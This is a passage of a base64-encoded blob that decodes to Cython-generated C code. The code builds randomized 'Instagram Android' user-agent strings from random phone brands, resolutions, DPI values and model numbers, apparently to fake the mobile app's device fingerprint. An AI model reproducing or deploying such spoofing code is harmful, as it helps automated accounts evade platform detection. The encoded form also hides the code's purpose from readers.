0XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE3XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM3MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM3MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzNzAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNzAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxN10sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzNzAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNzAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgIF9fcHl4X3RfOVswXSA9IF9fcHl4X3RfMjtcbiAgICAgIF9fcHl4X3RfOVsxXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV94O1xuICAgICAgX19weXhfdF85WzJdID0gX19weXhfdF83O1xuICAgICAgX19weXhfdF84ID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF85LCAzLCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzIpICsgMSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNyksIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzIpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNykpO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzcwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fcHl4X3ZfcmVzb2x1dGlvbiA9ICgoUHlPYmplY3QqKV9fcHl4X3RfOCk7XG4gICAgICBfX3B5eF90XzggPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNyA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzcxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX3B5eF90XzIgPSBQeUxpc3RfTmV3KDEyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzcxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TQU1TVU5HKTtcbiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1NBTVNVTkcpO1xuICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzIsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TQU1TVU5HKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNzEsIF9fcHl4X0wzX2Vycm9yKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFVBV0VJKTtcbiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0hVQVdFSSk7XG4gICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfMiwgMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0hVQVdFSSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzcxLCBfX3B5eF9MM19lcnJvcik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9MR0VfbGdlKTtcbiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9MR0VfbGdlKTtcbiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF8yLCAyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0xHRV9sZ2UpICE9ICgwKSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDNfZXJyb3IpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9IVEMpO1xuICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFRDKTtcbiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF8yLCAzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFRDKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNzEsIF9fcHl4X0wzX2Vycm9yKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQVNVUyk7XG4gICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9BU1VTKTtcbiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF8yLCA0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQVNVUykgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzcxLCBfX3B5eF9MM19lcnJvcik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1pURSk7XG4gICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9aVEUpO1xuICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzIsIDUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9aVEUpICE9ICgwKSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDNfZXJyb3IpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PTkVQTFVTKTtcbiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09ORVBMVVMpO1xuICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzIsIDYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PTkVQTFVTKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNzEsIF9fcHl4X0wzX2Vycm9yKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfWElBT01JKTtcbiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1hJQU9NSSk7XG4gICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfMiwgNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1hJQU9NSSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzcxLCBfX3B5eF9MM19lcnJvcik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09QUE8pO1xuICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfT1BQTyk7XG4gICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfMiwgOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09QUE8pICE9ICgwKSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDNfZXJyb3IpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9WSVZPKTtcbiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1ZJVk8pO1xuICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzIsIDksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9WSVZPKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNzEsIF9fcHl4X0wzX2Vycm9yKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU09OWSk7XG4gICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TT05ZKTtcbiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF8yLCAxMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1NPTlkpICE9ICgwKSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDNfZXJyb3IpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRUFMTUUpO1xuICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVBTE1FKTtcbiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF8yLCAxMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFQUxNRSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzcxLCBfX3B5eF9MM19lcnJvcik7XG4gICAgICBfX3B5eF90XzMgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMSkpKSB7XG4gICAgICAgIF9fcHl4X3RfNyA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMSk7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzcpO1xuICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMSk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfMyA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgX19weXhfdF8yfTtcbiAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF90XzEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzNzEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3ZfYnJhbmQgPSBfX3B5eF90Xzg7XG4gICAgICBfX3B5eF90XzggPSAwO1xuXG4gICAgICBcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzczLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzczLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMThdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzczLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM3MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgX19weXhfdl9idWlsZF9zdWZmaXggPSAoKFB5T2JqZWN0KilfX3B5eF90XzEpO1xuICAgICAgX19weXhfdF8xID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9hbmRyb2lkX3ZlcnNpb24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNzQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9icmFuZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM3NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fcHl4X3RfMTBbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0luc3RhZ3JhbV8zMTFfMF8wXzMyXzExOF9BbmRyb2lkO1xuICAgICAgX19weXhfdF8xMFsxXSA9IF9fcHl4X3RfMTtcbiAgICAgIF9fcHl4X3RfMTBbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X184O1xuICAgICAgX19weXhfdF8xMFszXSA9IF9fcHl4X3ZfZHBpO1xuICAgICAgX19weXhfdF8xMFs0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZHBpO1xuICAgICAgX19weXhfdF8xMFs1XSA9IF9fcHl4X3ZfcmVzb2x1dGlvbjtcbiAgICAgIF9fcHl4X3RfMTBbNl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X184O1xuICAgICAgX19weXhfdF8xMFs3XSA9IF9fcHl4X3RfODtcbiAgICAgIF9fcHl4X3RfMTBbOF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1NNX1Q7XG4gICAgICBfX3B5eF90XzEwWzldID0gX19weXhfdl9tb2RlbF9udW1iZXI7XG4gICAgICBfX3B5eF90XzEwWzEwXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfU01fVDtcbiAgICAgIF9fcHl4X3RfMTBbMTFdID0gX19weXhfdl9tb2RlbF9udW1iZXI7XG4gICAgICBfX3B5eF90XzEwWzEyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcWNvbV9lbl9VU181NDU5ODY7XG4gICAgICBfX3B5eF90XzEwWzEzXSA9IF9fcHl4X3ZfYnVpbGRfc3VmZml4O1xuICAgICAgX19weXhfdF8xMFsxNF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X185O1xuICAgICAgX19weXhfdF8yID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xMCwgMTUsIDM0ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xKSArIDIgKiAyICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdl9kcGkpICsgNSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3ZfcmVzb2x1dGlvbikgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzgpICsgNiAqIDIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF92X21vZGVsX251bWJlcikgKiAyICsgMjEgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF92X2J1aWxkX3N1ZmZpeCkgKyAxLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF92X2RwaSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdl9yZXNvbHV0aW9uKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzgpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3ZfbW9kZWxfbnVtYmVyKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF92X21vZGVsX251bWJlcikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdl9idWlsZF9zdWZmaXgpKTtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM3NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICBfX3B5eF92X3VzZXJfYWdlbnQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzIpO1xuICAgICAgX19weXhfdF8yID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzggPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNzUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZXMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNzUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcblxuICAgICAgXG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0cmluZyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM3NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FzY2lpX2xldHRlcnMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMzc2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdHJpbmcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNzYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kaWdpdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMzc2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgX19weXhfdF8xID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfMTEsIF9fcHl4X3RfMTIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNzYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgIF9fcHl4X3RfMyA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHtcbiAgICAgICAgX19weXhfdF84ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTtcbiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfOCk7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19weXhfdF8zID0gMDtcbiAgICAgIH1cbiAgICAgICNlbmRpZlxuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMSA6IDApXSA9IHtfX3B5eF90XzgsIF9fcHl4X3RfMX07XG4gICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMzc1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9rLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMzIsIF9fcHl4X3RfMTIsIF9fcHl4X2NhbGxhcmdz